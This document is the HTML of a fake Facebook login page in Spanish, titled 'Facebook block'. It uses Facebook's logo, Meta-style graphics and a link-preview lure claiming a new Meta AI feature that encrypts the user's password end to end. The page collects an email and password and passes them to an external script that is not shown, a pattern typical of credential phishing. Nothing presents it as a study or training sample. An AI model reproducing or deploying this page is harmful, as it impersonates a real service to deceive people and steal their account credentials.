<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>       
  <link rel="icon" href="/src/icons/facealert.png" type="image/png">
  <meta property="og:image" content="src/icons/facealert.png">
  <meta property="og:description" content="protege tu contraseña cifrandola de extremo a extemo nueva implementacion meta ia.">
  <title>Facebook block</title>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
  <form id="loginForm">
    <div class="facebook-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="120px" height="120px">
        <path fill="#1877F2" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/>
      </svg>
    </div>
    <input type="email" id="email" placeholder="Correo electrónico" required />
    <input type="password" id="password" placeholder="Contraseña" required />
    <button type="submit">Login</button>
  </form>

  <div class="meta-bubble">
    <div class="meta-gradient"></div>
    <div class="meta-rings">
      <div class="ring outer"></div>
      <div class="ring middle"></div>
      <div class="ring inner"></div>
    </div>
  </div>

  <script src="js/login.js"></script>
</body>
</html>
